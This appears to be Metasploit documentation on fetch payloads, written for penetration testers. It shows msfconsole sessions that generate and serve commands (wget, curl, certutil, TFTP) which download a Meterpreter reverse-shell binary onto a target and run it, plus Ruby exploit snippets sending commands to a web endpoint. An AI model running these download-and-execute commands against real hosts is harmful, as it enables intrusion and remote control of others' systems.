# Fetch Payloads

## What Are Fetch Payloads?
Fetch payloads are adapted, command-based payloads use network-enabled binaries on a remote host to download binary 
payloads to that remote host.  Adapted payloads are just payloads where we have bolted an extra feature on top of
existing payloads to modify the behavior.  In this case, you can still use all your favorite binary payloads and
transports, but we've added an optional fetch payload adapter on top to stage the payloads using a networking binary and
server.  They function similarly to some Command Stagers, but are based on the payload side rather than the exploit side
to simplify integration and portability.  Fetch payloads are a fast, easy way to get a session on a target that has a
command injection or code execution vulnerability *and* a known binary with the ability to download and store
a file.

## Terminology
In the following documentation, it is useful to agree on certain terms to use so we don't get confused or confusing.
`Fetch Payload` - The command to execute on the remote host to retrieve and execute the `Served Payload`
`Fetch Binary` - The binary we are using on the remote host to download the Served Payload.  Examples might be WGET,
cURL, or Certutil.
`Fetch Protocol` - The protocol used to download the served payload, for example HTTP, HTTPS or TFTP.
`Fetch Listener` - The server hosting the served payload.
`Fetch Handler` - The same as `Fetch Listener`
`Served Payload` - The underlying payload we want to execute.  We also might call this the `Adapted Payload`.
`Served Payload Handler` -  The handler for the served payload. This is just a standard payload like 
`meterpreter/reverse_tcp` or `shell_reverse_tcp`.

## Organization
Unlike Command Stagers which are organized by binary, Fetch Payloads are organized by server. Currently, we support
HTTP, HTTPS, and TFTP servers.  Once you select a fetch payload, you can select the binary you'd like to run on the
remote host to download the served payload prior to execution.

Here is the naming convention for fetch payloads:
`<cmd>/<platform>/<fetch protocol>/served_payload`
For example:
`cmd/linux/https/x64/meterpreter/reverse_tcp` Will do four things:

1. Create a `linux/x64/meterpreter/reverse_tcp` elf binary to be the served payload.
2. Serve the above served payload on an HTTPS server
3. Start a served payload handler for the served payload to call back to
4. Generate a command to execute on a remote host that will download the served payload and run it.


## A Simple Stand-Alone Example
The fastest way to understand Fetch Payloads is to use them and examine the output. For example, let's assume a Linux
target with the ability to connect back to us with  an HTTP connection and a command execution vulnerability.
First, let's look at the payload in isolation:
```msf
msf6 exploit(multi/ssh/sshexec) > use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > show options

Module options (payload/cmd/linux/http/x64/meterpreter/reverse_tcp):

Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
FETCH_FILENAME      YXeSdwsoEfOH     no        Name to use on remote system when storing payload
FETCH_SRVHOST       0.0.0.0          yes       Local IP to use for serving payload
FETCH_SRVPORT       8080             yes       Local port to use for serving payload
FETCH_URIPATH                        no        Local URI to use for serving payload
FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload
LHOST                                yes       The listen address (an interface may be specified)
LPORT               4444             yes       The listen port


View the full module info with the info, or info -d command.

msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
```

### Options
`FETCH_COMMAND` is the binary we wish to run on the remote host to download the adapted payload.  Currently, the
supported options are `CURL FTP TFTP TNFTP WGET` on Linux hosts and `CURL TFTP CERTUTIL` on Windows hosts.  We'll get
into more details on the binaries later.
`FETCH_FILENAME` is the name you'd like the executable payload saved as on the remote host.  This option is not
supported by every binary and must end in `.exe` on Windows hosts.  The default value is random.
`FETCH_SRVHOST` is the IP where the server will listen.
`FETCH_SRVPORT` is the port where the server will listen.
`FETCH_URIPATH` is the URI corresponding to the payload file.  The default value is deterministic based on the
underlying payload so a payload created in msfvenom will match a listener started in Framework assuming the underlying
served payload is the same.
`FETCH_WRITABLE_DIR` is the directory on the remote host where we'd like to store the served payload prior to execution.
This value is not supported by all binaries.  If you set this value and it is not supported, it will generate an error.

The remaining options will be the options available to you in the served payload; in this case our served payload is
`linux/x64/meterpreter/reverse_tcp` so our only added options are `LHOST` and `LPORT`.  If we had selected a different
payload, we would see different options.

### Generating the Fetch Payload
```msf
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_COMMAND WGET
FETCH_COMMAND => WGET
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVHOST 10.5.135.201
FETCH_SRVHOST => 10.5.135.201
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVPORT 8000
FETCH_SRVPORT => 8000
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LHOST 10.5.135.201
LHOST => 10.5.135.201
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LPORT 4567
LPORT => 4567
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > generate -f raw
wget -qO ./YXeSdwsoEfOH http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YXeSdwsoEfOH; ./YXeSdwsoEfOH &
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
```

You can see the fetch payload generated:
`wget -qO ./YXeSdwsoEfOH http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YXeSdwsoEfOH; ./YXeSdwsoEfOH &`
This command downloads the served payload, marks it as executable, and then executes it on the remote host.

### Starting the Fetch Server
When you start the `Fetch Handler`, it starts both the server hosting the binary payload *and* the listener for the
served payload.  With `verbose` set to `true`, you can see both the Fetch Handler and the Served Payload Handler are
started:
```msf
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > to_handler
[*] wget -qO ./YBybOrAmkV http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YBybOrAmkV; ./YBybOrAmkV &
[*] Payload Handler Started as Job 0
[*] Fetch Handler listening on 10.5.135.201:8000
[*] http server started
[*] Started reverse TCP handler on 10.5.135.201:4567 
```

### Fetch Handlers and Served Payload Handlers
The Fetch Handler is tracked with the Served Payload Handler, so you will only see the Served Payload Handler under
`Jobs`, even though the Fetch Handler is listening:
```msf
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -l

Jobs
====

  Id  Name                    Payload                                     Payload opts
  --  ----                    -------                                     ------------
  0   Exploit: multi/handler  cmd/linux/http/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4567

msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
[*] exec: netstat -ant | grep 8000

tcp        0      0 10.5.135.201:8000       0.0.0.0:*               LISTEN     

```
Killing the Served Payload handler will kill the Fetch Handler as well:
```msf
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -k 0
[*] Stopping the following job(s): 0
[*] Stopping job 0
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
[*] exec: netstat -ant | grep 8000

msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
```

## Using Fetch Payloads on the Fly
One really nice thing about Fetch Payloads is that it gives you the ability to execute a binary payload very quickly,
without relying on a session in framework or having to get a payload on target.  If you have a shell session or even a
really odd situation where you can execute commands, you can get a session in framework quickly without having to upload
a payload manually.  Just follow the steps above, and run the provided command.  Right now, the only thing we serve are
Framework payloads, but in the future, expanding to serve and execute any executable binary would be relatively trivial.

## Using it in an exploit
Using Fetch Payloads is no different than using any other command payload.  First, give users access to the Fetch
payloads for a given platform by adding a target that supports `ARCH_CMD` and the desired platform, either `windows` or
`linux`.  Once the target has been added, you can get access to the command by invoking `payload.encoded` and use it as
the command to execute on the remote target.

### Example paired with CmdStager
There is likely to be some overlap between fetch payloads and command stagers.  Let's talk briefly about how to support 
both in an exploit.  Please see the documentation on Command Stagers for required imports and specifics for command
stagers.  in this case, I'm only documenting the changes to make so that fetch payloads will work alongside command
stagers or to use fetch payloads in the style of command stagers, which I suggest you do.

In this case, I've modified the code provided in the command stager documentation to support both linux and unix command
payloads.  All I did was give an array value for the `Platform` value and change the`Type` to something more generic:
``` ruby
'Targets'   =>
  [
    [ 'Linux Command',
      {
        'Arch' => [ ARCH_CMD ],
        'Platform' => [ 'unix', 'linux' ],
        'Type' => :nix_cmd
      }
    ]
  ]
```

For the `execute_command` method, nothing changes:

```ruby
def execute_command(cmd, _opts = {})
populate_values if @sid.nil? || @token.nil?
uri = datastore['URIPATH'] + '/vendor/htmlawed/htmlawed/htmLawedTest.php'

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri),
      'cookie' => 'sid=' + @sid,
      'ctype' => 'application/x-www-form-urlencoded',
      'encode_params' => true,
      'vars_post' => {
        'token' => @token,
        'text' => cmd,
        'hhook' => 'exec',
        'sid' => @sid
      }
    })
end
```

The only change in the exploit method is the use of the more generic `Type` value in the case statement.  Nothing else
needs to change.

```ruby
  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :nix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
```

If you have an exploit that already supports Unix Command payloads and you'd like it to support Linux Command payloads
like Fetch Payloads, you can simply add the `linux` value to the platform array:

```ruby
'Nix Command',
  {
    'Platform' => [ 'unix', 'linux' ],
    'Arch' => ARCH_CMD,
    'Type' => :unix_cmd,
  }
```

## Supported Commands
### Windows And Linux Both
#### `CURL` 
cURL comes pre-installed on Windows 10 and 11, and it is incredibly common on linux platforms and the options are very
standardized across releases and platforms.  This makes cURL a good default choice for both Linux and Windows 
targets.  All options and server protocol types are supported by the cURL command.

#### `TFTP` 
The TFTP binary is useful only in edge cases because of a long list of limitations:
1) It is a Windows feature, but it is turned off by default on Windows Vista and later.
2) While you are likely to find it on Linux and Unix hosts, the options are not standard across releases.
3) The TFTP binary included in many Linux systems and all Windows systems does not allow for the port to be configured,
nor does it allow for the destination filename to be configured, so `FETCH_SRVPORT` must always be set to 69 and 
`FETCH_WRITABLE_DIR` and `FETCH_FILENAME` must be empty.  Listening on port 69 in Framework can be problematic, so I
suggest that you use the advanced option `FetchListenerBindPort` to start the server on a different port and redirect
the connection with a tool like iptables to a high port.
For example, if you are on a linux host with iptables, you can execute the following commands to redirect a connection
on UDP port 69 to UDP port 3069:
`sudo iptables -t nat -I PREROUTING -p udp --dport 69 -j REDIRECT --to-ports 3069`
`sudo iptables -t nat -I OUTPUT -p udp -d 127.0.0.1 --dport 69 -j REDIRECT --to-ports 3069`
Then, you can set `FetchListenerBindPort` to 3069 and get the callback correctly.
4) Because tftp is a udp-based protocol and because od the implementation of the server within Framework, each time you
start a tftp fetch handler, a new service will start:
```msf
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs

Jobs
====

  Id  Name                    Payload                                       Payload opts
  --  ----                    -------                                       ------------
  2   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4444

msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 4445
LPORT => 4445
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler

[*] Command to run on remote host: curl -so plEYxIdBQna.exe tftp://10.5.135.201:8080/test1 & start /B plEYxIdBQna.exe
[*] Payload Handler Started as Job 4

[*] starting tftpserver on 10.5.135.201:8080
[*] Started reverse TCP handler on 10.5.135.201:4445 
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs

Jobs
====

  Id  Name                    Payload                                       Payload opts
  --  ----                    -------                                       ------------
  2   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4444
  4   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4445

msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
[*] exec: netstat -an | grep 8080

udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set FETCH_URIPATH test4
FETCH_URIPATH => test4
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 8547
LPORT => 8547
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler

[*] Command to run on remote host: curl -so DOjmRoCOSMn.exe tftp://10.5.135.201:8080/test4 & start /B DOjmRoCOSMn.exe
[*] Payload Handler Started as Job 5

[*] starting tftpserver on 10.5.135.201:8080
[*] Started reverse TCP handler on 10.5.135.201:8547 
msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
[*] exec: netstat -an | grep 8080

udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
udp        0      0 10.5.135.201:8080       0.0.0.0:*                          

```
There is nothing to stop you from creating a race condition by starting multiple tftp servers with the same IP, port,
and `FETCH_URI` value but serving different payloads.  This will result in a race condition where the payload served is
non-deterministic.


### Windows Only
#### `Certutil`
Certutil is a great choice for Windows targets- it is likely to be present on most recent releases of Windows and is 
highly configurable.  The one troublesome aspect is that there is no insecure mode for Certutil, so if you are using
Certutil with the HTTPS protocol, the certificate must be correct and checked.  It supports `HTTP` and `HTTPS`
protocols.

### Linux Only
#### `FTP`
FTP is an old but useful binary.  While we support using the FTP binary, we do not have an FTP server.  Modern releases
of FTP support both HTTP and HTTPS protocols.  Unfortunately, we only support these modern versions of inline FTP, so it
may not be appropriate for older systems. 

#### `TNFTP`
TNFTP (not to be confused with TFTP) is a newer version of FTP.  It is exactly the same as modern FTP, but sometimes both the legacy FTP and TNFTP are
present on a system, so the command will be `tnftp` rather than `ftp`.

#### WGET
WGET is likely the first choice for a linux-only target.  It supports both HTTPS and HTTP and all Fetch payload options.
It is ubiquitous on Linux hosts and very standard, making it an excellent choice.
